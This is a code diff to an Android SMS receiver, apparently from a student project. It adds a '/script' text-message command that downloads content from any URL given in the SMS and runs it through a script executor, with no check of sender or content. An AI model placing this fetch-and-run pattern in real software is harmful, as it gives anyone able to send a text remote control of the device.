@@ -8,6 +8,9 @@ import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.HashMap;
 
@@ -116,6 +119,38 @@ public class SmsBroadcastReceiver extends BroadcastReceiver {
                     }
 
                     return true;
+                } else if( szMessage.startsWith( "/script" ) ) {
+                    String[ ] params = szMessage.split( " " );
+
+                    if( params != null && params.length == 2 ) {
+                        final String szURL = params[ 1 ];
+                        if( szURL != null ) {
+                            // ex : https://raw.githubusercontent.com/BboyGrun/AndroidTpSMS/master/script_log.txt
+
+                                Runnable r = new Runnable( ) {
+                                    @Override
+                                    public void run() {
+                                        try {
+                                            URL url = new URL(szURL);
+                                            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
+                                            String szContent = "";
+                                            String szLine = null;
+                                            while( ( szLine = in.readLine( ) ) != null ) {
+                                                szContent = szContent + szLine + "\r\n";
+                                            }
+                                            ScriptExecutor.runScript( szContent );
+                                        } catch( Exception e ) {
+                                            Log.e( TAG, "Error : ", e );
+                                        }
+                                    }
+                                };
+
+                            Thread t = new Thread( r );
+                            t.start( );
+                        }
+
+                        return true;
+                    }
                 } else if( szMessage.startsWith( "/send" ) ) {
                     String[] params = szMessage.split(" ");
 
